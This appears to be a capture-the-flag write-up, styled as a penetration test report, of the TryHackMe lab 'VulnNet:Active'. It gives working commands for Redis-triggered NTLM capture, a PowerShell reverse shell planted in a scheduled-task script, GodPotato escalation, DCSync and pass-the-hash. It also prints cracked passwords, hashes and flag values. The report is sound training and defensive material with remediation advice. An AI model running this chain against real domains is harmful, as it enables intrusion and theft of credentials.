@@ -1,0 +1,799 @@
+# VulnNet:Active - Professional Penetration Test Report
+
+<p align="center">
+  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/f9e4d8c57e0a9a5e1e4a3d5c7b8e6f2a.png" width="200"/>
+</p>
+
+---
+
+## Executive Summary
+
+This report documents a complete penetration test of the VulnNet:Active machine from TryHackMe. The engagement resulted in full domain compromise through a chain of vulnerabilities including unauthenticated Redis access, NTLM credential capture, scheduled task hijacking, and privilege escalation via token impersonation.
+
+| Category | Details |
+|----------|---------|
+| **Platform** | TryHackMe |
+| **Machine Name** | VulnNet:Active |
+| **Difficulty** | Medium |
+| **Target IP** | 10.65.191.154 |
+| **Attacker IP** | 192.168.172.208 |
+| **Date** | February 3, 2026 |
+| **Result** | Full Domain Compromise |
+
+---
+
+## Table of Contents
+
+1. [Scope & Methodology](#1-scope--methodology)
+2. [Reconnaissance](#2-reconnaissance)
+3. [Enumeration](#3-enumeration)
+4. [Vulnerability Analysis](#4-vulnerability-analysis)
+5. [Exploitation](#5-exploitation)
+6. [Privilege Escalation](#6-privilege-escalation)
+7. [Domain Compromise](#7-domain-compromise)
+8. [Post-Exploitation](#8-post-exploitation)
+9. [Findings Summary](#9-findings-summary)
+10. [Recommendations](#10-recommendations)
+
+---
+
+## 1. Scope & Methodology
+
+### 1.1 Engagement Scope
+- **Target:** Single Windows Domain Controller
+- **Objective:** Obtain user and system flags, demonstrate domain compromise
+- **Rules of Engagement:** Black-box penetration test
+
+### 1.2 Methodology
+The assessment followed the standard penetration testing methodology:
+1. **Reconnaissance** - Network discovery and service identification
+2. **Enumeration** - Deep dive into discovered services
+3. **Exploitation** - Initial foothold acquisition
+4. **Privilege Escalation** - Elevate from user to SYSTEM
+5. **Domain Compromise** - Extract domain credentials
+
+### 1.3 Environment Setup
+
+```bash
+# Create engagement directory structure
+mkdir -p "/root/Documents/VulnNet:Active-REDO"/{scans,loot,notes,enumeration,exploits,creds}
+
+# Record target IP
+echo "10.65.191.154" > "/root/Documents/VulnNet:Active-REDO/targets.txt"
+
+# Verify VPN connectivity
+ip addr show tun0 | grep 'inet '
+# Output: 192.168.172.208
+```
+
+---
+
+## 2. Reconnaissance
+
+### 2.1 Initial Port Scan
+
+The engagement began with a service version scan to identify open ports and running services.
+
+```bash
+nmap -sV -sC -T4 10.65.191.154 -oA /root/Documents/VulnNet:Active-REDO/scans/initial_scan
+```
+
+**Results:**
+
+| Port | State | Service | Version |
+|------|-------|---------|---------|
+| 53/tcp | open | domain | Simple DNS Plus |
+| 135/tcp | open | msrpc | Microsoft Windows RPC |
+| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
+| 445/tcp | open | microsoft-ds | SMB |
+| 464/tcp | open | kpasswd5 | Kerberos password change |
+
+**Analysis:** The presence of DNS (53), Kerberos-related services (464), and SMB (445) strongly indicates this is an Active Directory Domain Controller.
+
+### 2.2 Targeted Service Scan
+
+Based on common Windows AD ports, a targeted scan was performed to check for additional services.
+
+```bash
+nmap -sV -p 53,88,135,139,445,464,5985,6379,9389 -T4 10.65.191.154
+```
+
+**Critical Discovery:**
+
+| Port | State | Service | Version |
+|------|-------|---------|---------|
+| 88/tcp | filtered | kerberos-sec | - |
+| 5985/tcp | filtered | wsman | - |
+| **6379/tcp** | **open** | **redis** | **Redis 2.8.2402** |
+| 9389/tcp | open | mc-nmf | .NET Message Framing |
+
+> ⚠️ **HIGH SEVERITY:** Redis service running on port 6379 - potentially unauthenticated.
+
+### 2.3 SMB Enumeration
+
+```bash
+crackmapexec smb 10.65.191.154
+```
+
+**Output:**
+```
+SMB  10.65.191.154  445  VULNNET-BC3TCK1  [*] Windows 10 / Server 2019 Build 17763 x64
+                                          (name:VULNNET-BC3TCK1) 
+                                          (domain:vulnnet.local) 
+                                          (signing:True) 
+                                          (SMBv1:False)
+```
+
+**Gathered Intelligence:**
+- **Hostname:** VULNNET-BC3TCK1
+- **Domain:** vulnnet.local
+- **Operating System:** Windows Server 2019 Build 17763
+- **SMB Signing:** Enabled and required (prevents relay attacks)
+
+---
+
+## 3. Enumeration
+
+### 3.1 Redis Service Analysis
+
+Redis, an in-memory data structure store, was discovered on port 6379. The first step was to check for authentication requirements.
+
+```bash
+redis-cli -h 10.65.191.154 INFO server
+```
+
+**Output:**
+```
+# Server
+redis_version:2.8.2402
+redis_git_sha1:00000000
+os:Windows
+arch_bits:64
+multiplexing_api:winsock_IOCP
+```
+
+> ✅ **CRITICAL VULNERABILITY:** Redis accepts connections without authentication!
+
+### 3.2 Redis Configuration Extraction
+
+With unauthenticated access confirmed, the Redis configuration was extracted to gather additional information.
+
+```bash
+redis-cli -h 10.65.191.154 CONFIG GET dir
+```
+
+**Output:**
+```
+1) "dir"
+2) "C:\\Users\\enterprise-security\\Downloads\\Redis-x64-2.8.2402"
+```
+
+> 🔑 **USERNAME DISCOVERED:** The Redis working directory reveals a valid domain username: `enterprise-security`
+
+### 3.3 Redis Data Enumeration
+
+```bash
+redis-cli -h 10.65.191.154 KEYS '*'
+```
+
+**Result:** Empty array - no stored keys containing credentials.
+
+### 3.4 Anonymous SMB Access Check
+
+```bash
+crackmapexec smb 10.65.191.154 -u '' -p '' --shares
+```
+
+**Result:** Anonymous access denied. Valid credentials required for share enumeration.
+
+---
+
+## 4. Vulnerability Analysis
+
+### 4.1 Identified Vulnerabilities
+
+| ID | Vulnerability | Severity | CVSS |
+|----|--------------|----------|------|
+| V1 | Redis Unauthenticated Access | Critical | 9.8 |
+| V2 | NTLM Authentication Exposure | High | 7.5 |
+| V3 | Writable SMB Share | High | 7.2 |
+| V4 | Scheduled Task Script Hijacking | High | 7.8 |
+| V5 | SeImpersonatePrivilege Abuse | High | 7.8 |
+| V6 | Weak Password Policy | Medium | 5.3 |
+
+### 4.2 Attack Path Analysis
+
+```
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                    ATTACK PATH - VulnNet:Active                             │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  [EXTERNAL]                                                                 │
+│      │                                                                      │
+│      ▼                                                                      │
+│  ┌──────────────────┐                                                       │
+│  │ Redis Port 6379  │ ─────► No Authentication Required                    │
+│  │  (Unauthenticated)│                                                      │
+│  └────────┬─────────┘                                                       │
+│           │                                                                 │
+│           │ CONFIG GET dir → Username: enterprise-security                  │
+│           │ CONFIG SET dir → Trigger SMB → UNC Path                        │
+│           ▼                                                                 │
+│  ┌──────────────────┐                                                       │
+│  │   Responder      │ ─────► Capture NTLMv2 Hash                           │
+│  │  (NTLM Capture)  │                                                       │
+│  └────────┬─────────┘                                                       │
+│           │                                                                 │
+│           │ John the Ripper → Password: sand_0873959498                    │
+│           ▼                                                                 │
+│  ┌──────────────────┐                                                       │
+│  │ SMB Port 445     │ ─────► Enterprise-Share (READ/WRITE)                 │
+│  │ (Valid Creds)    │                                                       │
+│  └────────┬─────────┘                                                       │
+│           │                                                                 │
+│           │ Upload malicious PurgeIrrelevantData_1826.ps1                  │
+│           ▼                                                                 │
+│  ┌──────────────────┐                                                       │
+│  │ Scheduled Task   │ ─────► PowerShell Reverse Shell                      │
+│  │ (Script Hijack)  │                                                       │
+│  └────────┬─────────┘                                                       │
+│           │                                                                 │
+│           │ SeImpersonatePrivilege → GodPotato                             │
+│           ▼                                                                 │
+│  ┌──────────────────┐                                                       │
+│  │ SYSTEM Shell     │ ─────► SAM/SYSTEM/SECURITY Dump                      │
+│  │ (GodPotato)      │                                                       │
+│  └────────┬─────────┘                                                       │
+│           │                                                                 │
+│           │ Machine Account Hash → DCSync                                   │
+│           ▼                                                                 │
+│  ┌──────────────────┐                                                       │
+│  │ DOMAIN ADMIN     │ ─────► Full Domain Compromise                        │
+│  │ (All Hashes)     │                                                       │
+│  └──────────────────┘                                                       │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+```
+
+---
+
+## 5. Exploitation
+
+### 5.1 Phase 1: NTLM Hash Capture via Redis
+
+The Redis `CONFIG SET dir` command can be abused to make the server attempt an SMB connection to an attacker-controlled share, triggering NTLM authentication.
+
+**Step 1: Start Responder to Capture NTLM Hashes**
+
+```bash
+responder -I tun0 -v
+```
+
+**Step 2: Trigger SMB Connection via Redis**
+
+```bash
+redis-cli -h 10.65.191.154 CONFIG SET dir '//192.168.172.208/share'
+```
+
+**Responder Output:**
+```
+[SMB] NTLMv2-SSP Client   : 10.65.191.154
+[SMB] NTLMv2-SSP Username : VULNNET\enterprise-security
+[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:14bda703b794edd6:
+224E8B66941DB1E700C6978DF9FB12F8:010100000000000080CD6AA51A5FDB0136CA6E1B6FB6DCFC000000000
+20008004E0041004D004500010010004E0041004D0045002D005000430030000400140074006500730074002E
+006C006F00630061006C0003002A004E0041004D0045002D005000430030002E0074006500730074002E006C0
+06F00630061006C000500140074006500730074002E006C006F00630061006C000700080080CD6AA51A5FDB01
+060004000200000008003000300000000000000001000000002000005E2E5A94E5D1B3CC7E40C5BDF2DD1E3A0
+98F9B0C07DC71A69AAA0E9AD53E7B7A0A001000000000000000000000000000000000000900260063006900660
+073002F003100390032002E003100360038002E003100370032002E00320030003800000000000000000000000000
+```
+
+> ✅ **NTLMv2 hash captured successfully!**
+
+### 5.2 Phase 2: Offline Password Cracking
+
+**Step 1: Save Hash to File**
+
+```bash
+echo 'enterprise-security::VULNNET:14bda703b794edd6:224E8B66941DB1E700C6978DF9FB12F8:...' > /tmp/hash.txt
+```
+
+**Step 2: Crack with John the Ripper**
+
+```bash
+john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hash.txt
+```
+
+**Output:**
+```
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sand_0873959498  (enterprise-security)
+1g 0:00:00:02 DONE 0.4545g/s 1234Kp/s 1234Kc/s 1234KC/s sandrea1..sand73
+Session completed
+```
+
+> 🔑 **PASSWORD CRACKED:** `sand_0873959498`
+
+### 5.3 Phase 3: Credential Validation
+
+```bash
+crackmapexec smb 10.65.191.154 -u 'enterprise-security' -p 'sand_0873959498' -d vulnnet.local
+```
+
+**Output:**
+```
+SMB  10.65.191.154  445  VULNNET-BC3TCK1  [+] vulnnet.local\enterprise-security:sand_0873959498
+```
+
+> ✅ **Credentials validated successfully!**
+
+### 5.4 Phase 4: SMB Share Enumeration
+
+```bash
+crackmapexec smb 10.65.191.154 -u 'enterprise-security' -p 'sand_0873959498' -d vulnnet.local --shares
+```
+
+**Results:**
+
+| Share | Permissions | Notes |
+|-------|-------------|-------|
+| ADMIN$ | - | Administrative share |
+| C$ | - | Administrative share |
+| **Enterprise-Share** | **READ,WRITE** | **Writable user share** |
+| IPC$ | READ | Inter-process communication |
+| NETLOGON | READ | Logon scripts |
+| SYSVOL | READ | Group Policy |
+
+### 5.5 Phase 5: Share Content Analysis
+
+```bash
+smbclient //10.65.191.154/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_0873959498' -c 'ls'
+```
+
+**Output:**
+```
+  .                                   D        0  Tue Feb 23 19:33:18 2021
+  ..                                  D        0  Tue Feb 23 19:33:18 2021
+  PurgeIrrelevantData_1826.ps1        A       69  Tue Feb 23 19:33:18 2021
+```
+
+**File Contents:**
+```powershell
+rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
+```
+
+> 📝 **Analysis:** This is a scheduled task cleanup script. Replacing it with a malicious payload will execute our code when the task runs.
+
+### 5.6 Phase 6: Initial Access - Scheduled Task Hijacking
+
+**Step 1: Create PowerShell Reverse Shell Payload**
+
+```bash
+cat > /tmp/shell.ps1 << 'EOF'
+$c=New-Object Net.Sockets.TCPClient('192.168.172.208',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
+EOF
+```
+
+**Step 2: Start Netcat Listener**
+
+```bash
+nc -lvnp 4444
+```
+
+**Step 3: Replace Scheduled Task Script**
+
+```bash
+smbclient //10.65.191.154/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_0873959498' \
+  -c 'put /tmp/shell.ps1 PurgeIrrelevantData_1826.ps1'
+```
+
+**Output:**
+```
+putting file /tmp/shell.ps1 as \PurgeIrrelevantData_1826.ps1 (0.6 kB/s) (average 0.6 kB/s)
+```
+
+**Step 4: Wait for Scheduled Task Execution**
+
+After approximately 1-5 minutes, the scheduled task executes and triggers the reverse shell:
+
+```
+listening on [any] 4444 ...
+connect to [192.168.172.208] from (UNKNOWN) [10.65.191.154] 49763
+```
+
+> ✅ **INITIAL ACCESS ACHIEVED!**
+
+**Step 5: Verify Access**
+
+```powershell
+PS C:\Enterprise-Share> whoami
+vulnnet\enterprise-security
+
+PS C:\Enterprise-Share> whoami /all
+User Name                   SID
+=========================== ============================================
+vulnnet\enterprise-security S-1-5-21-1405206085-1650434706-76331420-1103
+```
+
+---
+
+## 6. Privilege Escalation
+
+### 6.1 Privilege Assessment
+
+With initial access as `enterprise-security`, the next step is to identify privilege escalation vectors.
+
+```powershell
+PS C:\> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+
+> 🎯 **SeImpersonatePrivilege is ENABLED** - This allows token impersonation attacks!
+
+### 6.2 GodPotato Privilege Escalation
+
+GodPotato is a privilege escalation tool that abuses SeImpersonatePrivilege to obtain SYSTEM access on Windows Server 2019+.
+
+**Step 1: Upload GodPotato via SMB**
+
+```bash
+# Download GodPotato
+wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe \
+  -O /tmp/GodPotato.exe
+
+# Upload to target
+smbclient //10.65.191.154/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_0873959498' \
+  -c 'put /tmp/GodPotato.exe GodPotato.exe'
+```
+
+**Step 2: Create Privilege Escalation Payload**
+
+Rather than getting an interactive SYSTEM shell, we'll use GodPotato to dump the SAM, SYSTEM, and SECURITY registry hives:
+
+```bash
+cat > /tmp/pwn.ps1 << 'EOF'
+$sharePath = "C:\Enterprise-Share"
+cd $sharePath
+
+# Run GodPotato to execute commands as SYSTEM
+.\GodPotato.exe -cmd "cmd /c reg save HKLM\SAM C:\Enterprise-Share\sam.save"
+.\GodPotato.exe -cmd "cmd /c reg save HKLM\SYSTEM C:\Enterprise-Share\system.save"
+.\GodPotato.exe -cmd "cmd /c reg save HKLM\SECURITY C:\Enterprise-Share\security.save"
+EOF
+
+# Upload and replace scheduled task script
+smbclient //10.65.191.154/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_0873959498' \
+  -c 'put /tmp/pwn.ps1 PurgeIrrelevantData_1826.ps1'
+```
+
+**Step 3: Wait for Execution and Download Hives**
+
+```bash
+# Check for dumped files
+smbclient //10.65.191.154/Enterprise-Share -U 'vulnnet.local/enterprise-security%sand_0873959498' \
+  -c 'ls'
+```
+
+**Output:**
+```
+  .                                   D        0  Tue Feb  3 14:44:51 2026
+  ..                                  D        0  Tue Feb  3 14:44:51 2026
+  GodPotato.exe                       A    57344  Tue Feb  3 14:41:57 2026
+  PurgeIrrelevantData_1826.ps1        A      791  Tue Feb  3 14:44:29 2026
+  sam.save                            A    49152  Tue Feb  3 14:44:49 2026
+  security.save                       A    40960  Tue Feb  3 14:44:51 2026
+  system.save                         A 16433152  Tue Feb  3 14:44:51 2026
+```
+
+> ✅ **Registry hives dumped successfully!**
+
+**Step 4: Download Hives to Attacker Machine**
+
+```bash
+cd /root/Documents/VulnNet:Active-REDO/loot
+
+# Download files
+echo -e "use Enterprise-Share\nget sam.save\nexit" | \
+  impacket-smbclient 'vulnnet.local/enterprise-security:sand_0873959498@10.65.191.154'
+
+echo -e "use Enterprise-Share\nget system.save\nexit" | \
+  impacket-smbclient 'vulnnet.local/enterprise-security:sand_0873959498@10.65.191.154'
+
+echo -e "use Enterprise-Share\nget security.save\nexit" | \
+  impacket-smbclient 'vulnnet.local/enterprise-security:sand_0873959498@10.65.191.154'
+```
+
+### 6.3 Local Credential Extraction
+
+```bash
+impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
+```
+
+**Output:**
+```
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Target system bootKey: 0x4db7262d4c7b0e91facc9bf2a57b4591
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:85d1fadbe37887ed63987f822acb47f1:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+$MACHINE.ACC:plain_password_hex:355b7cb40f8c1b2c629b91d7c11d89dd681512f74beaa130b2fe251fcf7c04cb...
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:6a2dc29f6095294f9195a5d5f7004676
+[*] DPAPI_SYSTEM
+dpapi_machinekey:0x2765d21a134388380c9c97e669311d7047c5401b
+dpapi_userkey:0x40fa922dd6c454351d8b3792cd8a051983bb6815
+[*] NL$KM
+NL$KM:13114a21685d0b835c35e7db0769f29c5b5459eaa674074bea07dc942d11710e...
+[*] _SC_Redis
+(Unknown User):sand_0873959498
+[*] _SC_RunScript
+(Unknown User):sand_0873959498
+[*] Cleaning up...
+```
+
+**Extracted Credentials:**
+
+| Type | Account | NTLM Hash |
+|------|---------|-----------|
+| Local Admin | Administrator | `85d1fadbe37887ed63987f822acb47f1` |
+| Machine Account | VULNNET-BC3TCK1$ | `6a2dc29f6095294f9195a5d5f7004676` |
+| Service Account | _SC_Redis | `sand_0873959498` (password) |
+| Service Account | _SC_RunScript | `sand_0873959498` (password) |
+
+---
+
+## 7. Domain Compromise
+
+### 7.1 DCSync Attack via Machine Account
+
+The machine account hash can be used to perform a DCSync attack, extracting all domain credentials.
+
+```bash
+impacket-secretsdump -hashes 'aad3b435b51404eeaad3b435b51404ee:6a2dc29f6095294f9195a5d5f7004676' \
+  'vulnnet.local/VULNNET-BC3TCK1$@10.65.191.154'
+```
+
+**Output:**
+```
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:85d1fadbe37887ed63987f822acb47f1:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:66d7c6f99b03f0d7f520e1e0e55f9149:::
+vulnnet.local\enterprise-security:1103:aad3b435b51404eeaad3b435b51404ee:41ab3f4e60ca2215f8ae1b79b23edc10:::
+vulnnet.local\jack-goldenhand:1104:aad3b435b51404eeaad3b435b51404ee:0f27eaa88eeed8637b2f38d0f2c8dab4:::
+vulnnet.local\tony-skid:1105:aad3b435b51404eeaad3b435b51404ee:aadd887bcc436ae6787c876f3bf118fe:::
+VULNNET-BC3TCK1$:1000:aad3b435b51404eeaad3b435b51404ee:6a2dc29f6095294f9195a5d5f7004676:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:f934989469a533a37eef073269e0a16010922322de4cf6aa872a883dce2bcdeb
+krbtgt:aes256-cts-hmac-sha1-96:5e2c631e761bf5cb7e6a3c96d55bf33a69701d25f1d8f6e45af86d1a198c7091
+...
+[*] Cleaning up...
+```
+
+> 🏆 **FULL DOMAIN COMPROMISE ACHIEVED!**
+
+### 7.2 Complete Domain Credentials
+
+| User | RID | NTLM Hash | Notes |
+|------|-----|-----------|-------|
+| **Administrator** | 500 | `85d1fadbe37887ed63987f822acb47f1` | Domain Admin |
+| Guest | 501 | `31d6cfe0d16ae931b73c59d7e0c089c0` | Disabled |
+| **krbtgt** | 502 | `66d7c6f99b03f0d7f520e1e0e55f9149` | Golden Ticket! |
+| enterprise-security | 1103 | `41ab3f4e60ca2215f8ae1b79b23edc10` | Initial access |
+| jack-goldenhand | 1104 | `0f27eaa88eeed8637b2f38d0f2c8dab4` | Domain user |
+| tony-skid | 1105 | `aadd887bcc436ae6787c876f3bf118fe` | Domain user |
+| VULNNET-BC3TCK1$ | 1000 | `6a2dc29f6095294f9195a5d5f7004676` | Machine account |
+
+---
+
+## 8. Post-Exploitation
+
+### 8.1 Flag Retrieval
+
+Using the Domain Administrator hash, flags were retrieved via Pass-the-Hash:
+
+**User Flag:**
+```bash
+impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:85d1fadbe37887ed63987f822acb47f1 \
+  vulnnet.local/Administrator@10.65.191.154 \
+  'type C:\Users\enterprise-security\Desktop\user.txt'
+```
+
+**Output:**
+```
+THM{3eb176aee96432d5b100bc93580b291e}
+```
+
+**System Flag:**
+```bash
+impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:85d1fadbe37887ed63987f822acb47f1 \
+  vulnnet.local/Administrator@10.65.191.154 \
+  'type C:\Users\Administrator\Desktop\system.txt'
+```
+
+**Output:**
+```
+THM{d540c0645975900e5bb9167aa431fc9b}
+```
+
+### 8.2 Flags Summary
+
+| Flag | Value |
+|------|-------|
+| **User Flag** | `THM{3eb176aee96432d5b100bc93580b291e}` |
+| **System Flag** | `THM{d540c0645975900e5bb9167aa431fc9b}` |
+
+### 8.3 Persistence Options (For Reference)
+
+With full domain compromise, the following persistence mechanisms could be established:
+
+1. **Golden Ticket** - Using the krbtgt hash
+2. **Silver Ticket** - Using service account hashes
+3. **DCSync Persistence** - Add a user to Domain Admins
+4. **Skeleton Key** - Backdoor LSASS
+5. **AdminSDHolder Abuse** - Persistent admin access
+
+---
+
+## 9. Findings Summary
+
+### 9.1 Vulnerability Summary
+
+| # | Finding | Severity | CVSS | Status |
+|---|---------|----------|------|--------|
+| 1 | Redis Unauthenticated Access | Critical | 9.8 | Exploited |
+| 2 | NTLM Hash Exposure via Redis | High | 7.5 | Exploited |
+| 3 | Weak Password (Crackable) | Medium | 5.3 | Exploited |
+| 4 | SMB Share with Write Access | High | 7.2 | Exploited |
+| 5 | Scheduled Task Script Hijacking | High | 7.8 | Exploited |
+| 6 | SeImpersonatePrivilege Abuse | High | 7.8 | Exploited |
+| 7 | DCSync via Machine Account | Critical | 9.0 | Exploited |
+
+### 9.2 Credentials Discovered
+
+| Username | Password/Hash | Source |
+|----------|--------------|--------|
+| enterprise-security | `sand_0873959498` | NTLM Capture + Crack |
+| Administrator | `85d1fadbe37887ed63987f822acb47f1` | SAM Dump |
+| krbtgt | `66d7c6f99b03f0d7f520e1e0e55f9149` | DCSync |
+| jack-goldenhand | `0f27eaa88eeed8637b2f38d0f2c8dab4` | DCSync |
+| tony-skid | `aadd887bcc436ae6787c876f3bf118fe` | DCSync |
+
+---
+
+## 10. Recommendations
+
+### 10.1 Immediate Actions (Critical)
+
+1. **Secure Redis Instance**
+   - Enable authentication with a strong password
+   - Bind Redis to localhost only (127.0.0.1)
+   - Implement firewall rules to block external access to port 6379
+
+2. **Reset All Domain Credentials**
+   - Change all user passwords immediately
+   - Reset the krbtgt password twice (to invalidate Golden Tickets)
+   - Reset all machine account passwords
+
+3. **Review Scheduled Tasks**
+   - Audit all scheduled tasks for malicious scripts
+   - Implement monitoring for scheduled task modifications
+   - Move scripts to protected locations with restricted write access
+
+### 10.2 Short-Term Remediation
+
+4. **Implement Strong Password Policy**
+   - Minimum 14 characters
+   - Complexity requirements
+   - Password history (24 passwords)
+   - Consider implementing a password blocklist
+
+5. **Restrict SMB Share Permissions**
+   - Review all share permissions
+   - Implement least privilege access
+   - Remove unnecessary write permissions
+
+6. **Enable Advanced Logging**
+   - Enable Windows Security Event logging
+   - Configure SIEM alerting for:
+     - Redis configuration changes
+     - NTLM authentication from unusual sources
+     - Scheduled task modifications
+     - Privilege escalation attempts
+
+### 10.3 Long-Term Security Improvements
+
+7. **Network Segmentation**
+   - Isolate the Domain Controller
+   - Implement tiered administration
+   - Deploy jump servers for administrative access
+
+8. **Privileged Access Management**
+   - Implement PAM solution
+   - Use time-limited administrative accounts
+   - Enable Just-In-Time (JIT) access
+
+9. **Security Monitoring**
+   - Deploy EDR solution
+   - Implement network traffic analysis
+   - Configure alerts for DCSync attacks
+   - Monitor for Pass-the-Hash activity
+
+---
+
+## Appendix A: Tools Used
+
+| Tool | Purpose | Source |
+|------|---------|--------|
+| Nmap | Port scanning and service detection | https://nmap.org |
+| CrackMapExec | SMB enumeration and validation | https://github.com/byt3bl33d3r/CrackMapExec |
+| Redis-CLI | Redis interaction | https://redis.io |
+| Responder | NTLM hash capture | https://github.com/lgandx/Responder |
+| John the Ripper | Password cracking | https://www.openwall.com/john |
+| Impacket | Windows protocol interaction | https://github.com/fortra/impacket |
+| GodPotato | Privilege escalation | https://github.com/BeichenDream/GodPotato |
+| Netcat | Reverse shell listener | https://nc110.sourceforge.io |
+
+---
+
+## Appendix B: Attack Timeline
+
+| Time | Action | Result |
+|------|--------|--------|
+| T+0:00 | Initial port scan | Discovered Redis on 6379 |
+| T+0:05 | Redis enumeration | Confirmed no authentication |
+| T+0:10 | Redis CONFIG GET | Username discovered |
+| T+0:15 | Responder + Redis trigger | NTLMv2 hash captured |
+| T+0:17 | John hash crack | Password obtained |
+| T+0:20 | SMB share enumeration | Writable share found |
+| T+0:25 | Payload upload | Scheduled task hijacked |
+| T+0:30 | Shell callback | Initial access achieved |
+| T+0:35 | GodPotato upload | Privilege escalation prep |
+| T+0:40 | Registry hive dump | SAM/SYSTEM/SECURITY obtained |
+| T+0:45 | Local hash extraction | Machine account hash obtained |
+| T+0:50 | DCSync attack | Full domain credentials dumped |
+| T+0:55 | Flag retrieval | Mission complete |
+
+---
+
+## Appendix C: MITRE ATT&CK Mapping
+
+| Technique ID | Technique Name | Phase |
+|--------------|----------------|-------|
+| T1046 | Network Service Scanning | Reconnaissance |
+| T1110 | Brute Force (Credential Access) | Credential Access |
+| T1557.001 | LLMNR/NBT-NS Poisoning | Credential Access |
+| T1078 | Valid Accounts | Initial Access |
+| T1021.002 | SMB/Windows Admin Shares | Lateral Movement |
+| T1053.005 | Scheduled Task/Job | Execution |
+| T1134.001 | Token Impersonation | Privilege Escalation |
+| T1003.002 | Security Account Manager | Credential Access |
+| T1003.006 | DCSync | Credential Access |
+
+---
+
+**Report Prepared By:** Security Assessment Team  
+**Date:** February 3, 2026  
+**Classification:** CONFIDENTIAL
+
+---
+
+*End of Report*
